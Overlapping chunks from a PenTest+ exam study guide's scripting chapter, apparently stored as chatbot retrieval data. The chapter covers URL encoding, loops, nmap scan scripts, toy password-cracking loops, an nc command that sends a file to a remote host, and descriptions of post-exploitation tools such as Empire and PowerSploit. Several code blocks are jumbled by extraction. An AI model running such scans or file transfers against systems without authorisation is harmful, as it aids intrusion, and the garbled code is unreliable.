rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	string/string and string/integer concatenation in each language later in the following sections. Another common string operation is encoding and decoding strings for use in URLs. There are many values that can't be passed within a URL as is, so they must be converted to a different form using a procedure known as percent encoding. For example, spaces cannot be included in a URL because they would be interpreted as the end of the URL. So, URL encoding replaces spaces with the percent code %20. Similarly, ampersands are used to separate variables in a URL query string, so they may not be contained in values and are replaced with the encoding %26. The following table shows a list of commonly used percent‐encoding values: ASCII character Percent‐encoding Space %20 ! %21 " %22 # %23 $ %24 % %25 & %26 ' %27 ( %28 ) %29 * %2A + %2B , %2C ASCII character Percent‐encoding ‐ %2D . %2E / %2F As an example, the following URL calls a page named process.php and attempts to pass the value Chapple & Seidl as the variable authors: www.example.com/process.php?name=Chapple & Seidl This URL would not parse properly because the space and ampersand are reserved characters. We can resolve this problem by percent‐encoding the string at the end of the URL: www.example.com/process.php?name=Chapple%20%26%20Seidl Bash To concatenate a string in Bash, you simply reference the variables next to each other. For example, here is a script that concatenates a first name and last name to form a full name: #!/bin/bash first="Mike " last="Chapple" name=$first$last echo $name This produces the following output: Mike Chapple This also works if we need to concatenate a string and an integer: #!/bin/bash prefix="His age is " age=14 sentence=$prefix$age echo $sentence which produces this output: His age is 14 Bash does not provide a built‐in percent‐encoding functionality. If you need to percent‐encode URLs, you will need to either use a different language or write a URL‐encoding function. PowerShell PowerShell uses the + operation to perform string concatenation. Here's the name concatenation script rewritten in PowerShell: $first="Mike " $last="Chapple" $name=$first + $last Write-Host $name You can also concatenate strings and integers directly in PowerShell. Here is the code to produce the age sentence: $prefix="His age is " $age=14 $sentence=$prefix + $age Write-Host $sentence PowerShell provides a built‐in ability to perform percent‐encoding by using the System.Web library. Here is sample code to encode the string "Chapple & Seidl": Add-Type -AssemblyName System.Web $url = "Chapple & Seidl" $encodedurl = [System.Web.HttpUtility]::UrlEncode($url) Write-Host "Original URL: " $url Write-Host "Encoded URL: " $encodedurl This produces the following output: Original URL: Chapple & Seidl Encoded URL: Chapple+%26+Seidl The spaces (%20) are represented by the plus signs. Ruby Ruby also uses the concatenation operator, so the code to produce a full name is quite similar to the PowerShell code: first="Mike " last="Chapple" name=first + last puts name However, Ruby does not allow you to concatenate strings and integers directly. If you try to execute this code: prefix="His age is " age=14
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	"Chapple & Seidl": Add-Type -AssemblyName System.Web $url = "Chapple & Seidl" $encodedurl = [System.Web.HttpUtility]::UrlEncode($url) Write-Host "Original URL: " $url Write-Host "Encoded URL: " $encodedurl This produces the following output: Original URL: Chapple & Seidl Encoded URL: Chapple+%26+Seidl The spaces (%20) are represented by the plus signs. Ruby Ruby also uses the concatenation operator, so the code to produce a full name is quite similar to the PowerShell code: first="Mike " last="Chapple" name=first + last puts name However, Ruby does not allow you to concatenate strings and integers directly. If you try to execute this code: prefix="His age is " age=14 sentence=prefix + ages puts sentence you receive an error message: string.rb:4:in '+': no implicit conversion of Fixnum into String (TypeError)from string.rb:4:in '<main>' This error indicates that Ruby tried to convert the numeric variable age into a string but did not know how to perform that conversion without explicit instructions. To resolve this problem, you must first convert the integer to a string by using the to_s method, which returns a string value. Here's the corrected code to produce the sentence “His age is 14” in Ruby: prefix="His age is " age=14 sentence=prefix + age.to_s puts sentence Ruby is able to perform URL encoding using the CGI.escape function from the cgi module. Here is sample code to perform that task: require 'cgi' url = "Chapple & Seidl" encodedurl = CGI.escape(url) puts "Original URL: ", url puts "Encoded URL: ", encodedurl If you run this code, you'll note that the encoded string is slightly different from the earlier example, returning Chapple+%26+Seidl using the + symbol instead of the %20 string to represent a space. These are functionally equivalent results. Python Python handles concatenation in a similar manner to PowerShell. Here's the code to do our basic concatenation: first="Mike " last="Chapple" name=first + last print(name) However, Python does not allow you to concatenate strings and integers directly. If you try to execute this code: prefix="His age is " age=14 sentence=prefix + age print(sentence) you receive an error message: TypeError: can only concatenate str (not "int") to str This error indicates that Python tried to combine the integer and string, but did not know how to perform that conversion without explicit instructions. To resolve this problem, you must first convert the integer to a string by using the str() function, which returns a string value. Here's the corrected code to produce the sentence “His age is 14” in Python: prefix="His age is " age=14 sentence=prefix + str(age) print(sentence) Python requires a separate module to perform URL encoding. You should use the quote_plus function found in the urllib.parse library. The code to perform URL encoding in Python is this: from urllib.parse import quote_plus url = "Chapple & Seidl" encodedurl = quote_plus(url) print("Original URL: ", url) print("Encoded URL: ", encodedurl) This produces the following output: Original URL: Chapple & Seidl Encoded URL: Chapple+%26+Seidl Flow Control In any of our languages, we can write a basic script as a series of commands that execute sequentially. For example,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	age is 14” in Python: prefix="His age is " age=14 sentence=prefix + str(age) print(sentence) Python requires a separate module to perform URL encoding. You should use the quote_plus function found in the urllib.parse library. The code to perform URL encoding in Python is this: from urllib.parse import quote_plus url = "Chapple & Seidl" encodedurl = quote_plus(url) print("Original URL: ", url) print("Encoded URL: ", encodedurl) This produces the following output: Original URL: Chapple & Seidl Encoded URL: Chapple+%26+Seidl Flow Control In any of our languages, we can write a basic script as a series of commands that execute sequentially. For example, the following Python script runs a port scan looking for systems on the 192.168.1.0/24 network that are listening for connections on port 22: import nmap scanner = nmap.PortScanner() scanner.scan('192.168.1.0/24', '22') print("Scan complete") This script consists of four lines, and Python will execute them sequentially. It begins with the first line, which imports the Nmap module. Once that command completes, the second line creates a port scanner, and the third line uses that port scanner to run the network scan. Finally, the fourth line prints a message to the user that the scan was complete. If you would like to run this script on your system, you will need to have the python‐nmap module installed. This is a library that allows you to run nmap scans from within Python. You can install the module using this command: pip install python-nmap Although the example script that we just looked at runs sequentially, not every script works that way. Flow control mechanisms provide developers with a way to alter the flow of a program. In the following sections, we'll look at two flow control techniques: conditional execution and looping. Conditional Execution Conditional execution allows developers to write code that executes only when certain logical conditions are met. The most common conditional execution structure is the if..then..else statement. The general idea of the statement is summarized in the following pseudocode: if (logical_test1) then command1 else if (logical_test2) then command2 else if (logical_test3) then command3 else command4 Here's how this works. When the program reaches this section of the code, it first checks to see if logical_test1 is true. If it is, then it executes command1 and the entire code statement is complete without performing any additional checks. If logical_test1 is false, then the program checks logical_test2. If that is true, then command2 executes. If logical_test2 is false, the program checks logical_test3. If that test is true, then command3 executes. If all three logical tests are false, then command4, contained within the else clause, executes. This logical testing, working with values of true and false, is an example of performing Boolean operations. An if..then..else statement may have one, many, or no else if clauses. The else clause is also optional. It's important to remember that, no matter how many clauses you have in your statement, only one can execute. The basic structure of the if..then..else statement exists in every programming language. The only difference lies
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	logical_test2 is false, the program checks logical_test3. If that test is true, then command3 executes. If all three logical tests are false, then command4, contained within the else clause, executes. This logical testing, working with values of true and false, is an example of performing Boolean operations. An if..then..else statement may have one, many, or no else if clauses. The else clause is also optional. It's important to remember that, no matter how many clauses you have in your statement, only one can execute. The basic structure of the if..then..else statement exists in every programming language. The only difference lies in the syntax. Let's take a look at each. We'll write a script in each language that runs an Nmap scan of a web server on Mondays and a database server on Wednesdays and a full network scan on other days. Bash In Bash, the syntax for the if..then..else statement is this: if [ logical_test1 ] then command1 elif [ logical_test2 ] command2 else command3 fi Notice the use of square brackets to contain the logical conditions, the elif keyword that begins an else if statement, and the fact that the entire block ends with the fi (if spelled backward) keyword. Here's how we'd write the code to scan the system located at 192.168.1.1 on Mondays, the system at 192.168.1.2 on Wednesdays, and the entire network on other days: #!/bin/bash weekday=$(date +%u) if [ $weekday==1 ] then /usr/local/bin/nmap 192.168.1.1 elif [ $weekday==3 ] then /usr/local/bin/nmap 192.168.1.2 else fi /usr/local/bin/nmap 192.168.1.0/24 In this code, $weekday is a variable that contains a numeric value corresponding to the day of the week, where 1 is Monday and 7 is Sunday. We covered variables earlier in the chapter. Focus for now on the control flow. You should be able to see how the script checks the day of the week and decides what command to execute. This script assumes that the nmap binary file is located at /usr/local/bin/nmap. As with all the scripts in this chapter, you may need to alter this path to match the location of binary files on your system. PowerShell PowerShell also provides an if..then..else clause, but the syntax is slightly different. The general syntax of the statement in PowerShell looks like this: if (logical_test1){ command1 } elseif (logical_test2) { command2 } else { command3 } Here's the same Nmap script that we wrote in Bash in the previous section, rewritten using PowerShell: $weekday=(get-date).DayOfWeek if ($weekday -eq 'Monday') { C:\nmap\nmap.exe 192.168.1.1 } elseif ($weekday -eq 'Wednesday') { C:\nmap\nmap.exe 192.168.1.2 } else { } C:\nmap\nmap.exe 192.168.1.0/24 Notice that PowerShell uses elseif instead of Bash's elif and also uses curly braces ({}) to enclose command blocks. There are a few other differences here, including the way PowerShell finds the weekday and performs comparisons, but you should see the structural similarity between this code and the Bash code. Python Finally, Python also includes an if..then..else statement that uses the following syntax: if logical_test1: command1 elif logical_test2: else: command2 command3 In an earlier section,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	rewritten using PowerShell: $weekday=(get-date).DayOfWeek if ($weekday -eq 'Monday') { C:\nmap\nmap.exe 192.168.1.1 } elseif ($weekday -eq 'Wednesday') { C:\nmap\nmap.exe 192.168.1.2 } else { } C:\nmap\nmap.exe 192.168.1.0/24 Notice that PowerShell uses elseif instead of Bash's elif and also uses curly braces ({}) to enclose command blocks. There are a few other differences here, including the way PowerShell finds the weekday and performs comparisons, but you should see the structural similarity between this code and the Bash code. Python Finally, Python also includes an if..then..else statement that uses the following syntax: if logical_test1: command1 elif logical_test2: else: command2 command3 In an earlier section, we wrote a basic Python script that was designed to run a single Nmap scan. Let's revise that code now to perform the same conditional execution task that we've written in Bash and PowerShell: import nmap import datetime weekday = datetime.date.today().weekday() nm = nmap.PortScanner() if weekday == 1: nm.scan('192.168.1.1') elif weekday == 3: nm.scan('192.168.1.2') else: nm.scan('192.168.1.0/24') Once again, we see the familiar structure of an if..then..else clause. In this case, Python uses the same if, elif, and else keywords as Bash. The distinguishing feature here is the use of colons after each logical condition. Identifying the Language of a Conditional Execution Statement As you prepare for the exam, you should be ready to analyze a segment of code and identify the language that the script uses. Remember, the answer will only be one of the three options covered on the PenTest+ exam: Bash, PowerShell, or Python. If you see a conditional execution statement in the segment, you may be able to use that segment alone to positively identify the language in use. Figure 12.1 contains a flowchart designed to help you decide. for Loops Looping operations allow you to repeat the same block of code more than one time. For example, you might want to run a certain piece of code 25 times, or once for each variable in a list. The for loop is one way that you can insert looping into your code. Here's a pseudocode example of how for loops are structured: for variable = start to finish code statements FIGURE 12.1 Identifying the language of a conditional execution statement This for loop will create a new variable with the name variable and give it the starting value specified in start. It will then run the code statements the first time. After they complete, it will add 1 to the value of variable and execute the code statements again. This process will repeat until variable takes on the value of finish. The exact behavior of this statement, including whether it executes the code one more time when the value of variable is equal to finish, depends on the programming language used. Here's a more concrete example, still written in pseudocode: for i = 0 to 10 print i This for loop would produce the following results: 0 1 2 3 4 5 6 7 8 9 Again, it may print one more line containing the value 10,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	1 to the value of variable and execute the code statements again. This process will repeat until variable takes on the value of finish. The exact behavior of this statement, including whether it executes the code one more time when the value of variable is equal to finish, depends on the programming language used. Here's a more concrete example, still written in pseudocode: for i = 0 to 10 print i This for loop would produce the following results: 0 1 2 3 4 5 6 7 8 9 Again, it may print one more line containing the value 10, depending on the programming language. Bash The general syntax of a for loop in Bash looks like this: for variable in range do commands done When using this syntax, you can provide the range in several different formats. If you'd like the for loop to iterate over a series of sequential integer values, you can specify them using the format {start..finish}. For example, the following script performs reverse DNS lookups for all of the IP addresses between 192.168.1.0 and 192.168.1.255: #!/bin/bash net="192.168.1." for hst in {0..255} do ip="$net$hst" nslookup $ip done As you analyze this script, think through how it works. It first creates a variable called net that contains the network prefix for all the IP addresses with the value 192.168.1. It then begins a for loop based on a new variable, hst, that contains an integer that begins with the value 0 and then iterates until it reaches the value 255. With each iteration, the code creates a string called ip that contains the net prefix followed by the hst suffix. On the first iteration, this string has the value 192.168.1.0. On the next iteration, it has the value 192.168.1.1. On the last iteration, it has the value 192.168.1.255. During each iteration, the code uses the nslookup command to check for a domain name associated with the IP address. If this confuses you, don't let it worry you too much. Remember, the PenTest+ exam doesn't require you to write code, only to analyze code. It's not reasonable to expect that you'll be able to pick up a book and learn to write code in three different programming languages! PowerShell Here's the basic syntax of a for loop in PowerShell: for (start; test; increment) { commands } Although this code performs the same task as a for loop in Bash, it approaches the task using different syntax. The start statement normally declares a new counter variable and sets its initial value. The test statement specifies the conditions under which the for loop should continue. The increment statement provides the code that should run at the completion of each loop. For example, here is PowerShell code that performs the same task as the Bash script in the previous section: $net="192.168.1." for($hst = 0; $hst -lt 256; $hst++) { $ip= $net + $hst nslookup $ip } We once again have a $net variable that contains the network prefix and an $hst
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Bash, it approaches the task using different syntax. The start statement normally declares a new counter variable and sets its initial value. The test statement specifies the conditions under which the for loop should continue. The increment statement provides the code that should run at the completion of each loop. For example, here is PowerShell code that performs the same task as the Bash script in the previous section: $net="192.168.1." for($hst = 0; $hst -lt 256; $hst++) { $ip= $net + $hst nslookup $ip } We once again have a $net variable that contains the network prefix and an $hst variable that contains the host suffix. The for loop initializes by setting the $hst variable to 0 and then uses the $hst++ operation to increase the value of $hst by 1 after each iteration. The test $hst ‐lt 256 makes the loop continue as long as the value of $hst is less than 256. Therefore, the last iteration will be for an $hst value of 255. Otherwise, the code functions identically to the Bash script from the previous section, performing name lookups for IP addresses ranging from 192.168.1.0 through 192.168.1.255. Python You'll find that the Python for loop syntax is quite similar to the Bash syntax. Here's the general structure: for variable in range: commands One important note: When you specify a range in Python, it includes the starting value but does not include the ending value. So, to specify a range of numbers that run from 0 through 255, we'd specify the starting value as 0 and the ending value as 256 using the syntax (0,256). Here's an example of the nslookup script converted to Python: import socket net = '192.168.1.' for hst in range(0,256): ip= net + str(hst) print(ip, ': ', socket.gethostbyaddr(ip), '\n') If you try to run the previous Python code, you'll probably see an error message that says something like this: "socket.herror: [Errno 1] Unknown host Don't worry about this yet. We'll fix it when we get to the section “Error Handling,” later in this chapter. Identifying the Language of a for Loop If you see a test question asking you to identify the language used for a segment of code and you find a for loop in that segment, you may have enough information to identify the language. Figure 12.2 contains a flowchart designed to help you decide. while Loops while loops are another type of looping statement. Similar to for loops, while loops repeat a block of code multiple times. Instead of repeating a fixed number of times, they repeat until a condition is no longer true. They use the following general syntax: while (condition) code statements The code statements will perform some modification to the variable(s) checked in the condition statement. The while loop will then repeat continuously until condition evaluates as false. For example, this while loop probes firewall ports until it detects an open port: open=0 port=0 while (open==0) open=check_firewall_port(port) port++ FIGURE 12.2 Identifying the language of a for loop This
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of looping statement. Similar to for loops, while loops repeat a block of code multiple times. Instead of repeating a fixed number of times, they repeat until a condition is no longer true. They use the following general syntax: while (condition) code statements The code statements will perform some modification to the variable(s) checked in the condition statement. The while loop will then repeat continuously until condition evaluates as false. For example, this while loop probes firewall ports until it detects an open port: open=0 port=0 while (open==0) open=check_firewall_port(port) port++ FIGURE 12.2 Identifying the language of a for loop This code will begin with port 0 and check to see if that port is open on the firewall. If it is, the value of open will become 1 and the loop will stop. If it is not open, the while loop will repeat, checking port 1. If there are no open ports on the firewall, this code will run forever (or at least until we exceed the maximum integer value for your operating system!). We did take another liberty with this example. We introduced a new construct called a function to hide some of the code. The code check_firewall_port(port) is calling a function named check_firewall_port with the argument port. We're assuming that someone already wrote this function and that we can simply reuse it. In the language‐specific examples that follow, we'll show you some simple functions. The basic idea of a function is that you call it with 0 or more arguments and it runs some code. It then returns a value that is the result of the function that we can store in a variable. In this case, the check_firewall_port function returns a value of 1 if the firewall port is open and 0 if it is closed. Bash Here is the basic structure for a while loop in Bash: while [ condition ] do code statements done This is a straightforward implementation of the general while syntax that we already discussed. Let's take a look at an example in a Bash script. The following code is designed to perform a simplified form of password cracking, which assumes that the password we're trying to crack is the name mike followed by an integer. It simply checks all possible passwords, beginning with mike0 and continuing with mike1, mike2, and so on until it finds the correct value. #!/bin/bash test_password() { if [ $1 = 'mike12345' ] then else } fi return 1 return 0 cracked=0 i=0 while [ $cracked -eq 0 ] do test="mike$i" test_password $test cracked=$? ((i++)) done echo 'Cracked Password:'$test The first portion of the code creates a function called test_password. In our simple example, the function simply checks whether the password being tested (denoted as $1 as it is the first argument to the test_password() function) is equal to the correct password value of mike12345. In a real password cracker, this function would reach out to the target system and try the password being tested. But we
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	if [ $1 = 'mike12345' ] then else } fi return 1 return 0 cracked=0 i=0 while [ $cracked -eq 0 ] do test="mike$i" test_password $test cracked=$? ((i++)) done echo 'Cracked Password:'$test The first portion of the code creates a function called test_password. In our simple example, the function simply checks whether the password being tested (denoted as $1 as it is the first argument to the test_password() function) is equal to the correct password value of mike12345. In a real password cracker, this function would reach out to the target system and try the password being tested. But we don't want to conduct a real password‐guessing attack here, so we'll use this dummy function. Next, we set two variables to 0. The first, cracked, is the flag variable that we'll use in our condition. When this is set to 0, we consider the value to be false; the password has not yet been cracked. When we find the correct password, we'll set this to 1, or true, to indicate that we've cracked the password. The second variable, i, is the counter that we will use to compose the passwords. From there, we enter the while loop. We want to continue running our code until the password is cracked and the cracked variable takes on the value 1. In each iteration, we'll compose a new password using the formula described earlier and then check it using the test_password function. We then set the cracked variable to the output of that function (denoted by $?) and increase the value of i by 1. This loop will only exit when we've found the correct password, so we put code at the end of the loop that prints the final value of test, which contains the cracked password. When we run this script, we see the following output: Cracked Password: mike12345 This tells us that the while loop executed 12,346 times. It cycled through 12,345 incorrect options, ranging from mike0 through mike12344, before finding the correct password: mike12345. PowerShell Here is the basic structure for a while loop in PowerShell: do { code statements } while(condition) The while statement functions in the same way it did in Bash. Let's write our password‐cracking script in PowerShell: function Test-Password { if ($args[0] -eq 'mike12345') { return 1 } else { return 0 } } $cracked=0 $i=0 do { $test='mike' + $i $cracked = Test-Password $test $i++ } while($cracked -eq 0) Write-Host "Cracked password:" $test You should be able to analyze this code, and though some of the syntax for PowerShell functions may be unfamiliar, you should still be able to gain a good understanding of how the code works. Remember, you don't need to write code on the exam—you only need to analyze it. Python Let's turn our attention to Python, where the syntax for a while loop is this: while condition: code statements And here is our password‐cracking script: def test_password(pw): if pw=='mike12345': return 1 else: return 0 cracked=0 i=0 while cracked == 0:
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	$i++ } while($cracked -eq 0) Write-Host "Cracked password:" $test You should be able to analyze this code, and though some of the syntax for PowerShell functions may be unfamiliar, you should still be able to gain a good understanding of how the code works. Remember, you don't need to write code on the exam—you only need to analyze it. Python Let's turn our attention to Python, where the syntax for a while loop is this: while condition: code statements And here is our password‐cracking script: def test_password(pw): if pw=='mike12345': return 1 else: return 0 cracked=0 i=0 while cracked == 0: test="mike" + str(i) cracked=test_password(test) i=i+1 print('Cracked Password:', test) Identifying the Language of a while Loop while loops can also provide you with important clues when you're asked to analyze a segment of code and identify the language that the script uses. If you see a while loop in the segment, you may be able to use that segment to identify the language in use. Figure 12.3 contains a flowchart designed to help you decide. FIGURE 12.3 Identifying the language of a while loop Input and Output (I/O) So far, we've written scripts and executed them from the command line. As a result, all of the output that we've created was displayed right under the prompt where we issued the command. That approach is referred to as sending output to the terminal. It's also possible to send output to either a file or a network location. Similarly, you may also provide input to a program from a file. Redirecting Standard Input and Output The easiest way to send output to a file is to redirect it at the command line using the > operator. For example, this command would run the password.py script in Python and save the output in a file named password_output.txt: python password.py> password_output.txt When you execute this command, the operating system creates a new file called password_output.txt and sends all the output that would normally be displayed on the screen to the file instead. If the file already exists, its contents are overwritten with the new information. If you'd like to append information to an existing file, you can do so with the >> operator. For example, the command python password.py>> password_output.txt will create a new file if password_output.txt doesn't already exist, but it will append the new output to an existing file if one resides on disk. To send input to a program from a file, you can use the < operator to indicate that you are sending the contents of a file to a program as input. For example, if you wanted to send wordlist.txt to password.py as input, you could issue this command: python password.py < wordlist.txt Finally, you can send the output of one program to the input of another program by using the pipe operator (|) to join the two programs together. For example, the following command would run the nmapweekday.py script and then send the output of that script to the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	disk. To send input to a program from a file, you can use the < operator to indicate that you are sending the contents of a file to a program as input. For example, if you wanted to send wordlist.txt to password.py as input, you could issue this command: python password.py < wordlist.txt Finally, you can send the output of one program to the input of another program by using the pipe operator (|) to join the two programs together. For example, the following command would run the nmapweekday.py script and then send the output of that script to the grep command, searching for any results that include the word http: python nmapweekday.py | grep http Network Input and Output You can also send output directly to or from a network connection using the nc command. For example, the following command uses nc to listen for input on port 8080 and then writes it to a file named web_input.txt: nc -l 8080> web_input.txt The ‐l flag instructs nc to listen on port 8080. It then stores whatever input is received on that port in the web_input.txt file. The nc command may also be used to send output to a remote location. For example, the following command would send the file web_input.txt from the current system to the system located at 192.168.1.1 on port 1234: nc 192.168.1.1 1234 < web_input.txt Comma‐Separated Values (CSV) Many penetration testing tools accept input and generate output in a standard file format known as comma‐separated values (CSV). CSV files contain a single line for each data record and then separate fields within that record using commas. They are straightforward text files that are almost universally accepted as input and produced as output due to their simplicity. Error Handling One of the most frequent ways a penetration tester (or attacker!) tries to exploit security flaws in software is by providing a program with unexpected input to induce an error condition. Developers should always use error‐handling techniques to detect and mitigate these situations. Most modern programming languages use a construct known as a try..catch clause to perform error handling. The try clause specifies command(s) to be executed, and the catch clause executes if those commands generate any errors. The commands in the catch clause “catch” the errors and handle them appropriately. Here's some pseudocode for a try..catch clause: try { some commands } catch { other commands executed only if there is an error } Bash Bash does not provide an explicit error‐handling functionality. Instead of relying on a nice try..catch function, developers who wish to implement error handling in Bash must write their own error‐handling routines using conditional execution clauses. This is complex and beyond the scope of this book. This is another good reason that developers writing production code generally eschew Bash in favor of more advanced languages. PowerShell Unlike Bash, PowerShell does support robust error‐handling functionality using the try..catch framework. For example, the nslookup command in the script written in the section “for Loops” earlier
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	only if there is an error } Bash Bash does not provide an explicit error‐handling functionality. Instead of relying on a nice try..catch function, developers who wish to implement error handling in Bash must write their own error‐handling routines using conditional execution clauses. This is complex and beyond the scope of this book. This is another good reason that developers writing production code generally eschew Bash in favor of more advanced languages. PowerShell Unlike Bash, PowerShell does support robust error‐handling functionality using the try..catch framework. For example, the nslookup command in the script written in the section “for Loops” earlier in this chapter might generate an error. Here is some PowerShell code designed to catch this error and print a generic error message instead of stopping execution: $net="192.168.1." for($hst = 0; $hst -lt 258; $hst++) { $ip= $net + $hst try { nslookup $ip } catch { "An error occurred." } } Python Python uses the same familiar try..catch framework, but it uses the except keyword instead of catch. Here's an example of the name resolution script from the section “for Loops” earlier in this chapter, rewritten to use error handling: import socket net = '192.168.1.' for hst in range(0,256): ip= net + str(hst) try: except: print(ip, ': ', socket.gethostbyaddr(ip), '\n') print(ip, ': Unknown host\n') Reusing Code Mature software development organizations realize that they often wind up performing the same or similar tasks from application to application and that reusing code between applications saves time and reduces errors. There are several ways that code may be reused: Classes are templates for complex data structures that may be reused between applications. For example, developers of cybersecurity tools might create a class called system that stores all the relevant information about a target system. That class might be useful in a vulnerability scanner, configuration management tool, asset management tool, and other applications. Developers may then reuse the system class across those applications, saving themselves time and promoting application interoperability. Procedures and functions are reusable code segments that accomplish a specific task. They generally accept input from other code, perform some transformation on that input, and then provide output. For example, in the “while Loops” section of this chapter, we created a function that tested passwords. Libraries, or modules, are collections of functions, classes, and other reusable code elements that may be imported into code, streamlining reuse. For example, the python‐nmap package in Python provides classes and functions that make it easy to run and interpret Nmap scans in Python. The Role of Coding in Penetration Testing Penetration testers may find themselves using code development and analysis tools in two different ways: analyzing the code used by attackers and automating their own work as penetration testers. Information Gathering Scripting plays a crucial role in automating many of the repetitive tasks involved in information gathering during penetration testing. Penetration testers can write or modify scripts to speed up tasks such as scanning large networks, collecting data on targets, and enumerating services. This allows testers
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Python provides classes and functions that make it easy to run and interpret Nmap scans in Python. The Role of Coding in Penetration Testing Penetration testers may find themselves using code development and analysis tools in two different ways: analyzing the code used by attackers and automating their own work as penetration testers. Information Gathering Scripting plays a crucial role in automating many of the repetitive tasks involved in information gathering during penetration testing. Penetration testers can write or modify scripts to speed up tasks such as scanning large networks, collecting data on targets, and enumerating services. This allows testers to focus on analyzing results rather than manually running each individual step of the information‐gathering process. One of the primary uses of scripting in information gathering is automating network scans and system queries. Rather than manually running a tool like Nmap or whois for each individual target, testers can create scripts to automate these scans across a large range of IP addresses or domain names. In addition to automating existing tools, scripting languages allow penetration testers to create their own custom tools for reconnaissance and enumeration. This is particularly useful when built‐in tools are insufficient or when testers want to create highly specific functionality. Data Manipulation The ability to manipulate large amounts of data quickly and efficiently is critical for success in penetration testing. After gathering information, penetration testers are often faced with parsing, filtering, and analyzing massive datasets generated from scans, enumeration processes, or other reconnaissance activities. Scripting languages such as Bash, Python, and PowerShell are essential tools for automating this data manipulation, ensuring that testers can quickly interpret results and focus on the next steps in the engagement. One of the key applications of scripting in data manipulation is automating the extraction of relevant information from large datasets. For instance, after running an Nmap scan or collecting logs from a web application, testers can write scripts to extract specific details, such as open ports, identified services, or error messages. This saves significant time and ensures accuracy when dealing with extensive data sources. Scripting also makes it easier to transform data into useful formats for analysis or reporting. Testers often need to convert raw data into more structured outputs like CSV files, JSON, or HTML reports. Scripting languages can be used to automate this process, allowing testers to create detailed, organized reports that can be easily shared with clients or team members without manual intervention. Another common use of scripting in data manipulation is string processing, such as cleaning up text, splitting and joining data fields, or encoding and decoding data for network communications. For example, testers can automate tasks like URL encoding or parsing large logs of HTTP requests to identify unusual patterns or specific values that might indicate vulnerabilities. Finally, when faced with large datasets from vulnerability scans or system logs, scripting allows testers to filter and sort through information more efficiently. Testers can automate processes that identify specific vulnerabilities or configuration issues from large results, making
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	or team members without manual intervention. Another common use of scripting in data manipulation is string processing, such as cleaning up text, splitting and joining data fields, or encoding and decoding data for network communications. For example, testers can automate tasks like URL encoding or parsing large logs of HTTP requests to identify unusual patterns or specific values that might indicate vulnerabilities. Finally, when faced with large datasets from vulnerability scans or system logs, scripting allows testers to filter and sort through information more efficiently. Testers can automate processes that identify specific vulnerabilities or configuration issues from large results, making it easier to prioritize the most critical findings. In addition, scripts can handle error conditions gracefully, automating retries or logging issues when data cannot be parsed correctly. Analyzing Exploit Code Penetration testers may encounter code used by attackers in attacks against their systems, or they may discover exploit code that they wish to use during their own tests. When examining exploit code, there are three common activities that may help determine the nature and purpose of the code: Enumeration techniques seek to identify all the instances of a resource in an environment. System enumeration seeks to identify all the systems on a network, user/account enumeration tries to identify the individuals with access to an environment, domain enumeration seeks to identify all valid subdomains for a parent domain, and so on. Downloading files from the Internet or other sources is commonly done to update malicious code, obtain instructions, or import new tools. Penetration testers should pay careful attention to these downloads, since the location and nature of files downloaded may provide clues to the identity and/or motivation of attackers. Launching remote access is one of the primary goals of attackers. Once they are able to run exploit code on a system, they seek to create a remote access capability that allows them to control the system from afar. Again, the nature of this remote access connection may provide important clues to the nature and purpose of an attack. Automating Penetration Tests Penetration testing is tedious work, and penetration testers should invest in automation techniques that might improve their efficiency. Let's explore some of the common tools that can assist with this work. PowerShell Modules Penetration testers working in PowerShell will find that there are several common PowerShell modules that make their work easier. The helpful PowerShell modules covered on the PenTest+ exam include: Empire is a post‐exploitation framework that allows for PowerShell‐ based exploitation, persistence, and data exfiltration. It provides a comprehensive platform for attackers to execute commands, escalate privileges, and move laterally across a network. PowerSploit is a collection of PowerShell scripts designed to aid in penetration testing. It includes modules for code execution, script obfuscation, privilege escalation, and data exfiltration, making it a versatile tool for post‐exploitation tasks. PowerView is a PowerShell module used for network situational awareness. It provides a variety of functions to discover and interact with Active Directory environments, allowing testers to enumerate domain users, groups,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	exam include: Empire is a post‐exploitation framework that allows for PowerShell‐ based exploitation, persistence, and data exfiltration. It provides a comprehensive platform for attackers to execute commands, escalate privileges, and move laterally across a network. PowerSploit is a collection of PowerShell scripts designed to aid in penetration testing. It includes modules for code execution, script obfuscation, privilege escalation, and data exfiltration, making it a versatile tool for post‐exploitation tasks. PowerView is a PowerShell module used for network situational awareness. It provides a variety of functions to discover and interact with Active Directory environments, allowing testers to enumerate domain users, groups, permissions, and much more. PowerUpSQL is a PowerShell toolkit designed for attacking SQL Server instances. It automates the discovery of SQL servers, tests for misconfigurations, and can be used to escalate privileges or gain access to sensitive data stored in SQL databases. AD search allows testers to query Active Directory for valuable information such as user accounts, group memberships, and system details. This helps in identifying potential targets or misconfigurations within an Active Directory environment. Python Libraries Python developers will find that the PenTest+ exam covers two different libraries they might commonly use: Impacket is a collection of Python classes focused on providing low‐ level programmatic access to network protocols. It is particularly useful for penetration testers in performing tasks such as crafting and sending packets, manipulating network traffic, and interacting with various protocols (e.g., SMB, RDP, LDAP). Impacket is often used for on‐path attacks, remote code execution, and lateral movement within networks. Scapy is a Python‐based interactive packet manipulation library. It allows users to create, send, capture, and manipulate network packets. Scapy supports a wide range of network protocols and is often used by penetration testers to craft custom packets for tasks like network scanning, spoofing, and vulnerability discovery. Its flexibility makes it a go‐to tool for network‐related reconnaissance and exploitation. Breach and Attack Simulation Tools Breach and attack simulation (BAS) tools help penetration testers automate the simulation of real‐world cyberattacks on a network, allowing organizations to assess the effectiveness of their security measures. BAS tools continuously test security controls by simulating various attack methods, from phishing to malware delivery, giving testers and security teams valuable insights into potential 